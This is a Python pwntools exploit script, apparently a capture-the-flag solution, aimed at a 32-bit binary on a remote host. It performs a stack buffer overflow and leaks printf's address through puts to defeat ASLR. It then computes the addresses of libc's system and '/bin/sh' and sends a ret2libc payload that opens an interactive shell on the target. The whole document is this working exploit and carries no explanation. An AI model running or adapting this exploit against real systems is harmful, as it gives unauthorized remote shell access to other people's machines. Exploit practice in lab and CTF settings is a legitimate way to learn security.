from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('111.200.241.244', 51728)
elf = ELF('./pwn')
libc = ELF('./libc_32.so.6')

io.recv(40)

io.sendlineafter(b'\n\n', cyclic(136 + 4) + p32(elf.plt['puts']) + \
		p32(0x8048888) + p32(elf.got['printf']))


printf_addr = u32(io.recv(4))
# libc = LibcSearcher('printf', printf_addr)
system_addr = printf_addr - libc.symbols['printf'] + libc.symbols['system']
binsh_addr = printf_addr - libc.symbols['printf'] + \
			next(libc.search(b'/bin/sh'))

io.sendline(cyclic(136 + 4) + p32(system_addr) + p32(0) + \
		p32(binsh_addr))

io.interactive()